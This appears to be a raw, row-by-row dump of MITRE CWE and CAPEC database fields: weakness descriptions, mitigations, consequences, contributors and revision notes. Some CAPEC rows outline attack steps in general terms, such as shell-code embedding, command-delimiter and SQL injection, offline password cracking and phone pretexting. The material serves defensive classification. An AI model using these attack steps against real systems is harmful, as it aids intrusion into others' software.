24545	42	Use a browser that displays Punycode for IDNs in the URL and status bars, or which color code various scripts in URLs.                   Due to the prominence of homoglyph attacks, several browsers now help safeguard against this attack via the use of Punycode. For example, Mozilla Firefox and Google Chrome will display IDNs as Punycode if top-level domains do not restrict which characters can be used in domain names or if labels mix scripts for different languages.
17709	63	Modify Files or Directories
15316	26	Architecture and Design
10967	28	Eric Dalci
18799	79	Confidentiality
18824	35	MITRE
17321	50	Implementation: Use SSL for connections between all parties with mutual authentication.
10688	23	The number of possible random values is smaller than needed by the product, making it more susceptible to brute force attacks.
22269	56	ChildOf
7952	28	CWE Content Team
9214	28	CWE Content Team
14410	39	2014-07-30
16826	35	MITRE
18839	62	updated Potential_Mitigations
8378	26	Architecture and Design
22982	56	ChildOf
23051	28	CWE Content Team
12974	35	MITRE
9402	35	MITRE
8755	35	MITRE
19850	39	2014-07-30
13962	49	2010
6625	35	MITRE
10748	28	CWE Content Team
18600	23	An adversary engages in pretexting behavior, assuming some sort of trusted role, and contacting the targeted individual or organization via phone to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. This is the most common social engineering attack. Some of the most commonly effective approaches are to impersonate a fellow employee, impersonate a computer technician or to target help desk personnel.
23133	39	2008-11-24
20748	48	03
19877	35	MITRE
25256	35	MITRE
22740	92	Exploit
15319	39	2017-11-08
23977	39	2012-10-30
21253	40	A server that has an implementation that accepts entities containing URI values.
16246	97	Probe Application Memory
10131	62	updated Common_Consequences, Potential_Mitigations, References
18246	63	Read Files or Directories
19952	43	Simple
9222	103	Primary
8669	39	2009-12-28
10263	55	CAPEC Content Team
20935	55	CAPEC Content Team
22856	100	The MITRE Corporation
20524	91	Implementation
9440	79	Authorization
14424	59	Updated References
5749	35	MITRE
25249	21	PLOVER
19607	28	CWE Content Team
17745	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, References, Relationships
18138	39	2012-10-30
12886	100	The MITRE Corporation
16401	23	The application does not use, or incorrectly uses, an input validation framework that is provided by the source language or an independent library.
24037	76	2017-01-09
21049	89	Detailed
9148	28	CWE Content Team
20836	28	CWE Content Team
10827	42	Use parameterized queries. This will help ensure separation between data plane and control plane.
15980	86	http://shsc.info/FileUploadSecurity
9606	31	1000
15721	28	CWE Content Team
17373	35	MITRE
11613	50	Monitor network activity to detect any anomalous or unauthorized communication exchanges.
15141	63	Read Application Data
11261	62	updated Potential_Mitigations
11187	50	Pre-design: Use a language or compiler that performs automatic bounds checking.
15812	62	updated Relationships
12592	56	PeerOf
11862	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
18050	62	updated Potential_Mitigations
16494	28	CWE Content Team
5624	78	High
6456	91	Implementation
12487	62	updated Modes_of_Introduction, Relationships, Relationship_Notes, Taxonomy_Mappings
7289	24	MITRE
25300	47	Bypass Protection Mechanism
6567	35	MITRE
18720	81	Access Control
6048	35	MITRE
24560	43	Simple
22736	79	Access Control
24052	56	PeerOf
8654	91	Operation
12899	28	CWE Content Team
20709	86	https://www.geeksforgeeks.org/virtual-destructor/
9869	62	updated Potential_Mitigations
16753	85	136
7706	76	2017-08-04
15709	39	2017-11-08
18841	27	Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.
19075	62	updated Relationships
15834	69	Draft
25167	62	updated Potential_Mitigations
23854	62	added/updated demonstrative examples
24528	28	CWE Content Team
15912	28	CWE Content Team
8556	35	MITRE
6740	56	ChildOf
24924	26	Operation
16484	35	MITRE
7373	39	2010-06-21
24701	39	2008-09-08
10205	46	When the expiration of a certificate is not taken into account, no trust has necessarily been conveyed through it. Therefore, the validity of the certificate cannot be verified and all benefit of the certificate is lost.
12721	95	[Investigate Target Environment] Determine the technologies used in the target environment such as types of browsers, web servers, application firewalls, proxies, etc.
24461	100	The MITRE Corporation
24313	39	2019-01-03
17299	39	2008-09-08
19331	60	13
20179	62	updated Relationships, Taxonomy_Mappings
9460	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
15283	61	Draft
25054	23	The program violates the Enterprise JavaBeans (EJB) specification by using AWT/Swing.
21779	35	MITRE
9382	53	The MITRE Corporation
25042	35	MITRE
6162	28	CWE Content Team
22340	103	Primary
6829	62	updated Potential_Mitigations
25141	62	updated Type
15335	76	2019-09-30
24598	35	MITRE
18900	40	Permissive session management mechanism that accepts random user-generated session identifiers
21623	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
16845	33	OpenAI
16124	35	MITRE
8000	62	updated Potential_Mitigations, Time_of_Introduction
9461	56	ChildOf
12103	100	The MITRE Corporation
13121	53	The MITRE Corporation
6906	62	updated Other_Notes, Weakness_Ordinalities
14473	35	Cigital
8572	95	[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.
14181	28	CWE Content Team
11555	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships
17344	28	CWE Content Team
16188	100	The MITRE Corporation
13122	103	Primary
8189	28	CWE Content Team
17462	35	MITRE
6144	104	216
12791	39	2017-01-19
21527	39	2010-12-13
11786	39	2019-01-03
12581	28	CWE Content Team
16685	42	Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.                   If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.
19082	28	CWE Content Team
11629	35	MITRE
19254	32	Beyond Security
11881	92	Exploit
25293	54	High
23248	27	Malware capable of acting on the adversary's objectives.
15366	103	Primary
14572	65	VIEW LIST: CWE-1000: Research Concepts
22657	45	Base
7769	35	MITRE
23907	39	2008-09-08
9512	63	Execute Unauthorized Code or Commands
18454	53	The MITRE Corporation
12270	39	2011-06-01
14087	21	CWE Content Team
17874	39	2011-06-01
8435	33	Pascal Meunier
11933	39	2012-10-30
7133	33	Chris Frohoff
21419	35	MITRE
15148	91	Architecture and Design
9895	31	699
12377	28	CWE Content Team
7943	81	Other
10479	62	updated Related_Attack_Patterns
22897	39	2017-05-03
21701	62	updated Time_of_Introduction
21820	62	updated Potential_Mitigations
23252	45	Base
7546	79	Availability
6720	39	2012-05-11
22256	61	Draft
9929	62	updated Common_Consequences
20290	63	Modify Files or Directories
11241	39	2011-06-01
14983	39	2008-11-24
8803	28	CWE Content Team
14890	63	Bypass Protection Mechanism
22594	62	updated Relationships, Taxonomy_Mappings
11679	81	Integrity
6662	103	Primary
19191	21	PLOVER
8183	62	updated Time_of_Introduction
12475	62	updated Demonstrative_Examples
21468	59	Updated Related_Attack_Patterns
9099	28	CWE Content Team
20643	63	DoS: Crash, Exit, or Restart
25161	70	Secure Programming for Linux and Unix HOWTO
22588	69	Draft
15347	31	1000
15431	81	Other
6992	31	699
12829	28	CWE Content Team
7925	21	PLOVER
15716	62	updated Related_Attack_Patterns
13141	42	Programming languages and supporting technologies might be chosen which are not subject to these issues.
11693	62	updated Time_of_Introduction
13394	55	CAPEC Content Team
24471	39	2008-09-08
17312	46	When software performs a security-critical calculation incorrectly, it might lead to incorrect resource allocations, incorrect privilege assignments, or failed comparisons among other things. Many of the direct results of an incorrect calculation can lead to even larger problems such as failed protection mechanisms or even arbitrary code execution.
22558	35	MITRE
8987	81	Confidentiality
24503	56	ChildOf
19402	39	2011-06-01
7897	101	CAPEC Content Team
17010	28	CWE Content Team
22604	81	Access Control
12351	26	Implementation
9613	28	CWE Content Team
7047	62	updated Common_Consequences
17063	28	CWE Content Team
6930	39	2011-06-27
14745	90	Language-Independent
6025	62	updated Related_Attack_Patterns, Relationships, Type
8138	28	CWE Content Team
21050	35	MITRE
7277	23	The software does not check the return value from a method or function, which can prevent it from detecting unexpected states and conditions.
12425	26	Architecture and Design
16112	46	In Java, using == or != to compare two strings for equality actually compares two objects for equality, not their values. Chances are good that the two references will never be equal. While this weakness often only affects program correctness, if the equality is used for a security decision, it could be leveraged to affect program security.
11862	26	Implementation
12878	47	Read Data
7397	35	MITRE
10696	50	Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.
13055	23	An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.
24975	81	Confidentiality
11839	35	Cigital
6472	88	Cleartext Storage of Sensitive Information in Memory
15760	35	MITRE
17938	26	Architecture and Design
18442	54	Low
12673	81	Non-Repudiation
20272	56	ChildOf
19029	28	CWE Content Team
21201	35	MITRE
9528	62	updated Common_Consequences, Demonstrative_Examples, Description, Maintenance_Notes, Name, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships
18849	63	Execute Unauthorized Code or Commands
10420	35	MITRE
18554	62	updated Relationships, Taxonomy_Mappings
22488	28	CWE Content Team
15328	86	http://java.sun.com/docs/books/tutorial/essential/concurrency/locksync.html
24336	28	CWE Content Team
10937	47	Read Data
17676	104	162
19254	36	http://www.securiteam.com/securityreviews/5CP0L0AHPC.html
15790	56	ChildOf
14172	39	2009-07-27
21497	35	MITRE
22716	39	2019-01-03
23722	43	Simple
14946	62	updated Potential_Mitigations
18741	63	Bypass Protection Mechanism
24728	31	699
11929	39	2011-06-01
12471	62	updated Demonstrative_Examples, Description, Name, Relationships
16174	31	699
7859	78	Very High
24762	76	2017-05-01
20941	35	MITRE
10266	79	Authorization
11514	54	Low
18748	35	MITRE
5861	27	The Attacker needs the ability to capture communications between the client being updated and the server providing the update.                In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client.
14504	35	MITRE
8802	46	An integer overflow or wraparound occurs when an integer value is incremented to a value that is too large to store in the associated representation. When this occurs, the value may wrap to become a very small or negative number. While this may be intended behavior in circumstances that rely on wrapping, it can have security consequences if the wrap is unexpected. This is especially the case if the integer overflow can be triggered using user-supplied inputs. This becomes security-critical when the result is used to control looping, make a security decision, or determine the offset or size in behaviors such as memory allocation, copying, concatenation, etc.
21012	88	Reliance on Runtime Component in Generated Code
7552	69	Incomplete
15193	62	updated Common_Consequences
5819	62	updated Relationships
8451	27	The adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively, the adversary can simply try to brute-force various encoding possibilities.
14232	66	Weak Password Brings 'Happiness' to Twitter Hacker
13569	28	CWE Content Team
24156	35	MITRE
24114	62	updated Relationships
16633	23	A PRNG uses a relatively small space of seeds.
20618	89	Standard
22357	79	Access Control
22347	103	Primary
20595	39	2008-07-01
11044	69	Draft
21863	35	MITRE
15223	39	2010-02-16
17639	43	Simple
10330	53	The MITRE Corporation
7176	28	Eric Dalci
21930	28	CWE Content Team
22146	47	Bypass Protection Mechanism
10944	43	Simple
21292	81	Availability
16373	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
15653	23	An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.
17724	62	updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationships
6493	42	Make fields transient to protect them from deserialization.                   An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.
6524	45	Variant
24145	23	The software attempts to drop privileges but does not check or incorrectly checks to see if the drop succeeded.
7867	96	2009-12-04
7957	39	2009-05-27
13630	62	updated Description
23934	89	Standard
11203	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
20326	103	Primary
13055	89	Standard
24782	39	2011-06-01
7135	39	2009-03-10
11122	79	Confidentiality
18695	28	CWE Content Team
20964	51	2014-06-23
13040	92	Exploit
23722	90	Language-Independent
23673	35	MITRE
5715	53	The MITRE Corporation
15219	31	700
8358	39	2008-09-08
13315	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
7212	42	If one breaks from a loop or function by throwing an exception, make sure that cleanup happens or that you should exit the program. Use throwing exceptions sparsely.
6421	62	updated Potential_Mitigations, Time_of_Introduction
10640	92	Exploit
16272	28	CWE Content Team
6787	62	updated Relationships
22349	101	CAPEC Content Team
18664	35	Cigital
8973	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24450	54	High
19259	28	CWE Content Team
14142	80	An attacker needs to understand Unicode encodings and have an idea (or be able to find out) what system components may not be Unicode aware.
20789	39	2012-05-11
9850	73	Identify and embed shell code for the target system.
23359	28	CWE Content Team
11172	40	The victim must trust the name and locale of user controlled filenames.
6582	103	Primary
19507	35	MITRE
25082	31	1000
13047	35	MITRE
10858	45	Variant
20066	89	Standard
12727	66	Sanitizing user data: How and where to do it
23683	42	Do not use standard weak security questions and use several security questions.
9006	46	If a malicious individual has access to the file system, it is possible to elevate privileges by inserting such a file as "C:\Program.exe" to be run by a privileged program making use of WinExec.
24257	39	2008-07-01
25200	28	Eric Dalci
18353	62	updated Relationships
18951	97	Try All Common Switches
12743	28	CWE Content Team
19266	71	2012
16246	50	Cloud providers should completely delete data to render it irrecoverable and inaccessible from any layer and component of infrastructure resources.
11508	79	Authorization
22634	62	Suggested OWASP Top Ten 2004 mapping
9523	97	Exploiting Trust in Client
11308	81	Availability
23630	85	576
10272	62	updated Related_Attack_Patterns
7720	28	CWE Content Team
7737	35	MITRE
7754	28	CWE Content Team
9664	39	2010-06-21
18878	35	Cigital
22581	62	updated Potential_Mitigations
11653	49	2017
13446	39	2011-09-13
11294	35	MITRE
23766	35	MITRE
22737	40	Attacker needs mobile phone numbers to initiate the connection. The attacker must guess an area of interest for the mobile user to entice them to follow the link provided in the text message. The attacker must have a replicated web site as in a normal Phishing attack.
9135	76	2017-08-04
16740	103	Primary
19266	70	Fragmentation Considered Vulnerable
10102	62	updated Common_Consequences
8730	28	CWE Content Team
12786	92	Experiment
12918	62	updated Name, Relationships, Taxonomy_Mappings
9189	35	MITRE
23155	62	updated Potential_Mitigations
20997	90	Language-Independent
23633	39	2019-01-03
14661	35	MITRE
23426	21	PLOVER
22384	35	MITRE
19931	96	2009-03-03
21309	91	Architecture and Design
19832	73	Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requests
23522	28	Eric Dalci
6513	69	Incomplete
19054	62	updated Relationships
19555	62	updated Demonstrative_Examples
23348	31	1000
6300	28	CWE Content Team
24181	102	CanFollow
8024	73	Perform an offline dictionary attack or a rainbow table attack against a known password hash.
14360	28	CWE Content Team
14259	63	Bypass Protection Mechanism
21652	35	MITRE
20309	102	ChildOf
7195	62	updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
21780	62	updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
11055	27	None: No specialized resources are required to execute this type of attack.
14660	56	ChildOf
6314	39	2009-05-27
9204	47	Read Data
7455	43	Simple
17655	28	CWE Content Team
10384	54	High
15583	101	CAPEC Content Team
5761	39	2014-07-30
6380	103	Primary
13581	62	updated Relationships
13977	73	Research target platform to determine whether it supports symbolic links.
11055	54	Medium
19921	39	2011-06-01
16601	35	MITRE
16386	81	Availability
13947	81	Other
17147	88	Creation of Temporary File With Insecure Permissions
6577	31	1000
18053	91	Implementation
7067	62	added/updated white box definitions
5802	104	134
24644	35	MITRE
10130	102	ChildOf
20648	39	2014-02-18
19627	56	ChildOf
8397	61	Draft
14540	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   To reduce the likelihood of introducing an out-of-bounds read, ensure that you validate and ensure correct calculations for any length argument, buffer size calculation, or offset. Be espcially careful of relying on a sentinel (i.e. special character such as NUL) in an untrusted inputs.
10683	79	Confidentiality
16946	76	2015-11-09
14170	63	Reduce Performance
12295	101	CAPEC Content Team
19639	80	Adversaries can obtain and set up open-source network sniffing tools easily.
13438	62	updated Relationships
10867	43	Simple
7163	53	The MITRE Corporation
9124	33	Egidio Romano
7677	72	No authentication takes place in this process, bypassing an assumed protection of encryption.
8426	62	updated Potential_Mitigations
19348	39	2008-07-01
24679	28	CWE Content Team
10842	35	MITRE
20832	35	MITRE
11095	35	Cigital
18587	88	Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')
14280	62	updated Related_Attack_Patterns
9780	69	Draft
15059	28	CWE Content Team
12580	85	43
6983	63	Modify Files or Directories
16318	86	http://www.phrack.org/issues.html?issue=60&id=10#article
21574	39	2008-07-01
9678	78	High
16165	40	Access to the system containing the ATA Drive so that the drive can be physically removed from the system.
15667	39	2012-05-11
21405	39	2010-12-13
12713	90	Language-Independent
6781	35	MITRE
20327	103	Primary
10137	35	MITRE
17683	23	This attack targets the log files of the target host. The attacker injects, manipulates or forges malicious log entries in the log file, allowing him to mislead a log audit, cover traces of attack, or perform other malicious actions. The target host is not properly controlling log access. As a result tainted data is resulting in the log files leading to a failure in accountability, non-repudiation and incident forensics capability.
10242	26	Implementation
13824	28	CWE Content Team
13319	62	updated Taxonomy_Mappings
11035	100	The MITRE Corporation
21926	42	Ensure that you perform access control checks related to your business logic. These checks may be different than the access control checks that you apply to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor.
12342	28	CWE Content Team
14061	91	Architecture and Design
7147	62	updated Potential_Mitigations
5855	35	Cigital
12910	59	Updated Attack_Phases, Related_Weaknesses
24295	62	updated Other_Notes, Relevant_Properties, Theoretical_Notes
23009	62	updated Potential_Mitigations
17699	26	Implementation
11726	62	updated Description, Name
14632	92	Explore
17914	35	MITRE
14931	26	Implementation
18916	28	CWE Content Team
12521	62	updated Potential_Mitigations
14928	62	updated Related_Attack_Patterns
20198	28	CWE Content Team
21869	28	CWE Content Team
12890	103	Primary
12829	39	2011-06-01
16728	56	ChildOf
17285	35	MITRE
6614	39	2008-09-08
18427	47	Gain Privileges
9494	28	CWE Content Team
7400	62	updated Time_of_Introduction
15901	59	Updated Attack_Motivation-Consequences, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
10673	62	updated Relationships, Taxonomy_Mappings
19523	74	3
22775	39	2017-11-08
18194	90	Language-Independent
13702	35	Cigital
9025	103	Primary
19943	35	MITRE
18502	28	CWE Content Team
12880	31	1000
15607	62	added/updated demonstrative examples
15917	90	Java
9579	31	699
8071	62	updated Relationships
10760	90	Language-Independent
18326	33	RSnake
6646	99	Microsoft Press
10066	103	Primary
7888	39	2019-09-19
5980	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
18559	57	Resultant
11148	63	Gain Privileges or Assume Identity
18922	88	Excessive Reliance on Global Variables
10558	62	updated Demonstrative_Examples
19352	26	Implementation
6564	42	When creating a link to an external document using the <a> tag with a defined target, for example "_blank" or a named frame, provide the rel attribute with a value "noopener noreferrer".                   If opening the external document in a new window via javascript, then reset the opener by setting it equal to null.
24988	39	2009-10-29
20328	62	updated Description, Relationships
25364	35	MITRE
5843	45	Variant
21109	43	Simple
11627	28	CWE Content Team
10445	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
23653	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
13329	63	Other
20350	72	If the incorrect calculation is used in the context of resource allocation, it could lead to an out-of-bounds operation (CWE-119) leading to a crash or even arbitrary code execution. Alternatively, it may result in an integer overflow (CWE-190) and / or a resource consumption problem (CWE-400).
21862	56	ChildOf
14587	35	MITRE
15891	39	2011-03-29
6606	59	Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns
9792	51	2015-11-09
11245	63	Varies by Context
21243	28	CWE Content Team
8111	28	CWE Content Team
16451	35	MITRE
7552	57	Indirect
25008	102	ChildOf
12412	95	Attackers with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data.
24838	62	updated Relationships
9929	28	CWE Content Team
8302	31	1000
9671	104	1164
6668	26	Architecture and Design
7432	55	CAPEC Content Team
9228	23	Creating and using insecure temporary files can leave application and system data vulnerable to attack.
21996	71	2009
14079	39	2009-12-28
23860	62	updated Time_of_Introduction
15834	90	C++
22616	28	CWE Content Team
17232	91	Architecture and Design
12574	28	CWE Content Team
17401	78	Medium
22702	35	MITRE
5708	28	CWE Content Team
17773	91	Testing
21810	81	Confidentiality
23757	39	2014-06-23
16398	46	This weakness is most likely to occur in loosely typed languages, or in strongly typed languages in which the types of variable arguments cannot be enforced at compilation time, or where there is implicit casting.
16497	26	Implementation
9011	62	updated Potential_Mitigations, Time_of_Introduction
25028	35	MITRE
20684	28	CWE Content Team
14508	88	Excessive Number of Inefficient Server-Side Data Accesses
13520	28	CWE Content Team
11716	79	Integrity
20722	28	CWE Content Team
23464	39	2012-05-11
22148	28	CWE Content Team
15047	28	Eric Dalci
16761	79	Access Control
20975	28	CWE Content Team
15850	43	Simple
8848	26	Architecture and Design
12786	73	Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)
13109	48	04
7588	77	Manual Static Analysis - Source Code
14612	39	2008-09-08
6995	60	07
19123	97	Cross-Site Scripting (XSS)
9510	42	If you are using finalize() as it was designed, there is no reason to declare finalize() with anything other than protected access.
21113	53	The MITRE Corporation
16698	69	Incomplete
15611	103	Primary
24046	62	updated Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Modes_of_Introduction, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Weakness_Ordinalities
8029	35	Veracode
6339	39	2008-07-01
23526	28	CWE Content Team
8395	28	CWE Content Team
8668	26	Architecture and Design
11960	91	Architecture and Design
24638	35	MITRE
11473	39	2014-07-30
17724	39	2013-02-21
19011	79	Access Control
10622	23	An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network. Although certain techniques for protocol analysis benefit from manipulating live 'on-the-wire' interactions between communicating components, static or dynamic analysis techniques applied to executables as well as to device drivers, such as network interface drivers, can also be used to reveal the function and characteristics of a communication protocol implementation. Depending upon the methods used the process may involve observing, interacting, and modifying actual communications occurring between hosts. The goal of protocol analysis is to derive the data transmission syntax, as well as to extract the meaningful content, including packet or content delimiters used by the protocol. This type of analysis is often performed on closed-specification protocols, or proprietary protocols, but is also useful for analyzing publicly available specifications to determine how particular implementations deviate from published specifications.
22498	28	CWE Content Team
10833	35	MITRE
25189	21	CWE Content Team
23850	91	Architecture and Design
11313	39	2019-06-20
15930	104	106
15724	66	Securing Device Objects
14155	90	Language-Independent
14175	40	Distribution means must code (through channel, message identifiers, or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves.
11499	50	If an attacker cannot attack the scheme directly, he might try to alter the environment that affects the signing and verification processes. A possible mitigation is to avoid reliance on flags or environment variables that are user-controllable.
16381	44	High
18007	28	CWE Content Team
21152	101	CAPEC Content Team
14323	33	Thomas H. Ptacek
19510	28	CWE Content Team
10132	76	2018-07-31
11606	28	CWE Content Team
8606	28	CWE Content Team
20074	57	Primary
23395	47	Execute Unauthorized Commands
9227	23	The application stores sensitive data under the web document root with insufficient access control, which might make it accessible to untrusted parties.
16935	79	Non-Repudiation
21015	35	MITRE
15547	62	updated Description, Relationships, Taxonomy_Mappings
20933	39	2009-03-10
11615	35	MITRE
19927	23	When the product encounters an error condition or failure, its design requires it to fall back to a state that is less secure than other options that are available, such as selecting the weakest encryption algorithm or using the most permissive access control restrictions.
10648	35	MITRE
16330	62	updated Background_Details, Other_Notes, Potential_Mitigations
23660	26	Operation
16209	26	Architecture and Design
13887	103	Primary
23131	35	MITRE
7757	28	CWE Content Team
18459	35	MITRE
24187	31	1000
19489	91	Architecture and Design
14274	39	2012-10-30
13640	74	3
17776	79	Integrity
21149	35	MITRE
15647	79	Integrity
13306	39	2012-05-11
6459	28	CWE Content Team
20509	62	updated Relationships
24923	33	Jeff Atwood
22141	28	CWE Content Team
13211	62	updated Relationships, Taxonomy_Mappings
11298	69	Draft
12868	62	updated References, Potential_Mitigations, Time_of_Introduction
17739	78	Low
18220	39	2014-07-30
15589	28	CWE Content Team
10934	104	325
21307	33	Raoul Strackx
16753	54	High
11614	81	Confidentiality
15863	51	2015-11-09
13757	42	This defense-in-depth technique can be used to prevent the improper usage of frames in web applications. It prioritizes the valid sources of data to be loaded into the application through the usage of declarative policies. Based on which implementation of Content Security Policy is in use, the developer should use the "frame-ancestors" directive or the "frame-src" directive to mitigate this weakness. Both directives allow for the placement of restrictions when it comes to allowing embedded content.
18007	62	updated Common_Consequences
18669	45	Variant
23308	28	CWE Content Team
10084	45	Variant
24036	23	An adversaries may add malicious content to a website through the open file share and then browse to that content with a web browser to cause the server to execute the content. The malicious content will typically run under the context and permissions of the web server process, often resulting in local system or administrative privileges depending on how the web server is configured.
15848	31	1000
21954	26	Implementation
13169	45	Base
13806	62	updated Relationships
16375	35	MITRE
10806	72	Attackers could execute unauthorized commands, which could then be used to disable the software, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.
19834	28	CWE Content Team
5679	88	Incomplete Model of Endpoint Features
19776	39	2019-01-03
22092	57	Indirect
19585	45	Base
23393	50	Implementation: Perform output validation for all remote content.
16110	47	Read Data
20920	31	1000
13309	39	2010-06-21
10933	101	CAPEC Content Team
5915	43	Simple
8873	39	2008-07-01
13087	35	MITRE
22064	39	2012-05-11
19563	55	CAPEC Content Team
16788	100	The MITRE Corporation
7800	100	The MITRE Corporation
10609	62	updated Related_Attack_Patterns
19523	95	[Inject SQL via SOAP Parameters] The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.
15624	39	2011-06-01
15650	96	2018-01-04
10181	35	MITRE
17947	42	Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.
18359	91	Architecture and Design
20492	92	Exploit
8861	103	Primary
22976	39	2010-12-13
24675	28	CWE Content Team
19403	39	2014-07-30
19427	35	MITRE
8340	50	Leverage security kernel modules providing advanced access control and process restrictions like SELinux.
15536	81	Confidentiality
18653	31	1000
13898	51	2014-06-23
23912	31	1000
10965	35	MITRE
20484	39	2008-07-01
22212	79	Confidentiality
7787	28	CWE Content Team
5774	28	CWE Content Team
7856	53	The MITRE Corporation
13915	104	350
21498	100	The MITRE Corporation
8941	55	CAPEC Content Team
21768	63	Alter Execution Logic
16057	89	Standard
14577	81	Integrity
17762	28	CWE Content Team
11514	89	Detailed
10845	63	Read Application Data
10749	63	Read Application Data
23455	23	The software receives input from an upstream component, but it does not account for byte ordering (e.g. big-endian and little-endian) when processing the input, causing an incorrect number or value to be used.
14596	28	CWE Content Team
22661	91	Architecture and Design
18535	62	updated Relationships
6346	39	2017-11-08
22746	62	updated Common_Consequences
9788	86	http://valgrind.org/
6788	86	http://safeint.codeplex.com/
20334	35	MITRE
21669	56	ChildOf
25086	42	Disable script execution functionality in the clients' browser.
11084	48	08
8321	28	CWE Content Team
8990	35	MITRE
15325	46	An improper check for certificate revocation is a far more serious flaw than related certificate failures. This is because the use of any revoked certificate is almost certainly malicious. The most common reason for certificate revocation is compromise of the system in question, with the result that no legitimate servers will be using a revoked certificate, unless they are sorely out of sync.
9088	46	If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.
19204	81	Integrity
21657	88	Improper Restriction of Operations within the Bounds of a Memory Buffer
25280	76	2019-09-30
6283	31	699
10042	90	C
14411	85	599
12480	91	Operation
7023	43	Simple
11226	35	MITRE
18862	63	Read Application Data
9187	28	Eric Dalci
19117	39	2012-10-30
22916	63	Read Application Data
19582	91	Requirements
17925	70	Vulnerability Note VU#800113
22865	31	699
12267	62	updated Time_of_Introduction
9381	100	The MITRE Corporation
18981	39	2018-03-27
13524	35	MITRE
5922	28	CWE Content Team
24405	28	CWE Content Team
5830	21	PLOVER
17655	39	2012-10-30
10845	81	Access Control
11263	35	MITRE
20776	94	Run Arbitrary Code
16064	39	2019-06-20
16941	31	1000
10632	39	2009-05-27
8289	21	PLOVER
13823	56	ChildOf
10584	69	Draft
18693	28	CWE Content Team
